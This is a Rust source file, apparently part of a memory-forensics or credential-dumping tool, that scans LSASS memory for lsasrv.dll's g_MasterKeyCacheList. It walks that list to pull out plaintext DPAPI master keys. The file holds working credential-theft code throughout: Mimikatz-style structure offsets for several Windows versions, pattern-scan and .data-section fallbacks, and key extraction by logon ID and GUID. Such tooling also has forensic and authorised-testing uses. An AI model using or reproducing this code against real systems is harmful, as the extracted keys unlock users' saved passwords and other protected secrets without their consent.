use crate::error::Result;
use crate::lsass::crypto::CryptoKeys;
use crate::lsass::patterns;
use crate::lsass::types::DpapiCredential;
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// KIWI_MASTERKEY_CACHE_ENTRY offsets vary by Windows version.
struct DpapiOffsets {
    flink: u64,
    luid: u64,
    key_size: u64,
    guid: u64,
    key_data: u64,
}

const DPAPI_OFFSET_VARIANTS: &[DpapiOffsets] = &[
    // Win10+ / Win11 / Server 2016+: extended structure with unk0/flags fields
    DpapiOffsets { flink: 0x00, luid: 0x10, key_size: 0x20, guid: 0x38, key_data: 0x48 },
    // Win7 / Win8 / Win8.1 / Server 2008R2-2012R2: classic layout
    // GUID immediately after LUID, keySize after insertTime
    DpapiOffsets { flink: 0x00, luid: 0x10, key_size: 0x30, guid: 0x18, key_data: 0x38 },
];

/// Extract DPAPI master key cache entries from lsasrv.dll.
///
/// Master keys are stored in plaintext in the g_MasterKeyCacheList linked list.
/// No decryption is needed.
pub fn extract_dpapi_credentials(
    vmem: &impl VirtualMemory,
    lsasrv_base: u64,
    _lsasrv_size: u32,
    _keys: &CryptoKeys,
) -> Result<Vec<(u64, DpapiCredential)>> {
    let pe = PeHeaders::parse_from_memory(vmem, lsasrv_base)?;

    // Try .text pattern scan first, fall back to .data section scan
    let list_addr = match pe.find_section(".text") {
        Some(text) => {
            let text_base = lsasrv_base + text.virtual_address as u64;
            match patterns::find_pattern(
                vmem,
                text_base,
                text.virtual_size,
                patterns::DPAPI_MASTER_KEY_PATTERNS,
                "g_MasterKeyCacheList",
            ) {
                Ok((pattern_addr, _)) => patterns::find_list_via_lea(vmem, pattern_addr, "g_MasterKeyCacheList")?,
                Err(e) => {
                    log::debug!("DPAPI .text pattern scan failed ({}), trying .data fallback", e);
                    find_dpapi_list_in_data(vmem, &pe, lsasrv_base)?
                }
            }
        }
        None => find_dpapi_list_in_data(vmem, &pe, lsasrv_base)?,
    };

    log::info!("DPAPI g_MasterKeyCacheList at 0x{:x}", list_addr);

    // Auto-detect offset variant
    let head_flink = vmem.read_virt_u64(list_addr).unwrap_or(0);
    let offsets = if head_flink != 0 && head_flink != list_addr {
        detect_dpapi_offsets(vmem, head_flink)
    } else {
        &DPAPI_OFFSET_VARIANTS[0]
    };
    walk_masterkey_list(vmem, list_addr, offsets)
}

/// Walk the g_MasterKeyCacheList linked list and extract entries.
fn walk_masterkey_list(
    vmem: &impl VirtualMemory,
    list_addr: u64,
    offsets: &DpapiOffsets,
) -> Result<Vec<(u64, DpapiCredential)>> {
    let mut results = Vec::new();

    let head_flink = vmem.read_virt_u64(list_addr)?;
    if head_flink == 0 || head_flink == list_addr {
        log::info!("DPAPI: master key cache is empty");
        return Ok(results);
    }

    let mut current = head_flink;
    let mut visited = std::collections::HashSet::new();

    loop {
        if current == list_addr || visited.contains(&current) || current == 0 {
            break;
        }
        visited.insert(current);

        let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
        let key_size = vmem.read_virt_u32(current + offsets.key_size).unwrap_or(0);

        if key_size > 0 && key_size <= 256 {
            if let Ok(guid_bytes) = vmem.read_virt_bytes(current + offsets.guid, 16) {
                let guid = format_guid(&guid_bytes);
                if let Ok(key) = vmem.read_virt_bytes(current + offsets.key_data, key_size as usize) {
                    log::debug!(
                        "DPAPI: LUID=0x{:x} GUID={} key_size={}",
                        luid, guid, key_size
                    );
                    results.push((
                        luid,
                        DpapiCredential {
                            guid,
                            key,
                            key_size,
                        },
                    ));
                }
            }
        }

        current = match vmem.read_virt_u64(current + offsets.flink) {
            Ok(f) => f,
            Err(_) => break,
        };
    }

    log::info!("DPAPI: found {} master key cache entries", results.len());
    Ok(results)
}

/// Auto-detect DPAPI offset variant by probing the first entry.
fn detect_dpapi_offsets(vmem: &impl VirtualMemory, first_entry: u64) -> &'static DpapiOffsets {
    for variant in DPAPI_OFFSET_VARIANTS {
        let key_size = match vmem.read_virt_u32(first_entry + variant.key_size) {
            Ok(k) => k,
            Err(_) => continue,
        };
        // Valid DPAPI master key sizes: 32, 48, or 64 bytes
        if !matches!(key_size, 32 | 48 | 64) {
            continue;
        }
        let guid_bytes = match vmem.read_virt_bytes(first_entry + variant.guid, 16) {
            Ok(g) => g,
            Err(_) => continue,
        };
        // GUID should not be all zeros
        if guid_bytes.iter().all(|&b| b == 0) {
            continue;
        }
        let d1 = u32::from_le_bytes([guid_bytes[0], guid_bytes[1], guid_bytes[2], guid_bytes[3]]);
        if d1 != 0 {
            log::debug!("DPAPI: auto-detected offsets key_size=0x{:x} guid=0x{:x} key=0x{:x}",
                variant.key_size, variant.guid, variant.key_data);
            return variant;
        }
    }
    &DPAPI_OFFSET_VARIANTS[0]
}

/// Fallback: scan lsasrv.dll .data section for g_MasterKeyCacheList LIST_ENTRY head.
///
/// Validates candidates by checking that the first entry looks like a
/// KIWI_MASTERKEY_CACHE_ENTRY (reasonable keySize, readable GUID).
fn find_dpapi_list_in_data(
    vmem: &impl VirtualMemory,
    pe: &PeHeaders,
    lsasrv_base: u64,
) -> Result<u64> {
    let data_sec = pe
        .find_section(".data")
        .ok_or_else(|| crate::error::GovmemError::PatternNotFound(
            ".data section in lsasrv.dll".to_string(),
        ))?;

    let data_base = lsasrv_base + data_sec.virtual_address as u64;
    let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x20000);
    let data = vmem.read_virt_bytes(data_base, data_size)?;

    log::debug!(
        "DPAPI: scanning lsasrv.dll .data for g_MasterKeyCacheList: base=0x{:x} size=0x{:x}",
        data_base, data_size
    );

    for off in (0..data_size.saturating_sub(16)).step_by(8) {
        let flink = u64::from_le_bytes(data[off..off + 8].try_into().unwrap());
        let blink = u64::from_le_bytes(data[off + 8..off + 16].try_into().unwrap());

        // Both must be valid heap pointers or self-referencing
        if flink < 0x10000 || (flink >> 48) != 0 {
            continue;
        }
        if blink < 0x10000 || (blink >> 48) != 0 {
            continue;
        }
        // Must not point within lsasrv.dll itself (would be a different global)
        if flink >= lsasrv_base && flink < lsasrv_base + 0x200000 {
            continue;
        }

        let list_addr = data_base + off as u64;

        // Self-referencing empty list is valid
        if flink == list_addr && blink == list_addr {
            continue; // Empty list, skip (could be any LIST_ENTRY)
        }

        // Validate: first entry's Flink should point back or forward validly
        let entry_flink = match vmem.read_virt_u64(flink) {
            Ok(f) => f,
            Err(_) => continue,
        };
        if entry_flink != list_addr && (entry_flink < 0x10000 || (entry_flink >> 48) != 0) {
            continue;
        }

        // Validate: LUID at +0x10 should be reasonable (stable across versions)
        let luid = match vmem.read_virt_u64(flink + 0x10) {
            Ok(l) => l,
            Err(_) => continue,
        };
        if luid > 0xFFFFFFFF {
            continue;
        }

        // Try each offset variant to validate keySize and GUID
        let mut validated = false;
        for variant in DPAPI_OFFSET_VARIANTS {
            let key_size = match vmem.read_virt_u32(flink + variant.key_size) {
                Ok(k) => k,
                Err(_) => continue,
            };
            if !matches!(key_size, 32 | 48 | 64) {
                continue;
            }
            let guid_bytes = match vmem.read_virt_bytes(flink + variant.guid, 16) {
                Ok(g) => g,
                Err(_) => continue,
            };
            if guid_bytes.iter().all(|&b| b == 0) {
                continue;
            }
            let d1 = u32::from_le_bytes([guid_bytes[0], guid_bytes[1], guid_bytes[2], guid_bytes[3]]);
            if d1 != 0 {
                validated = true;
                break;
            }
        }
        if !validated {
            continue;
        }

        log::debug!(
            "DPAPI: found g_MasterKeyCacheList candidate at 0x{:x}: flink=0x{:x}",
            list_addr, flink
        );
        return Ok(list_addr);
    }

    Err(crate::error::GovmemError::PatternNotFound(
        "g_MasterKeyCacheList in lsasrv.dll .data section".to_string(),
    ))
}

/// Format a 16-byte GUID as "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx".
fn format_guid(bytes: &[u8]) -> String {
    if bytes.len() < 16 {
        return hex::encode(bytes);
    }
    // GUID layout: Data1 (LE u32), Data2 (LE u16), Data3 (LE u16), Data4 (8 bytes)
    let d1 = u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]);
    let d2 = u16::from_le_bytes([bytes[4], bytes[5]]);
    let d3 = u16::from_le_bytes([bytes[6], bytes[7]]);
    format!(
        "{:08x}-{:04x}-{:04x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
        d1, d2, d3,
        bytes[8], bytes[9],
        bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15],
    )
}
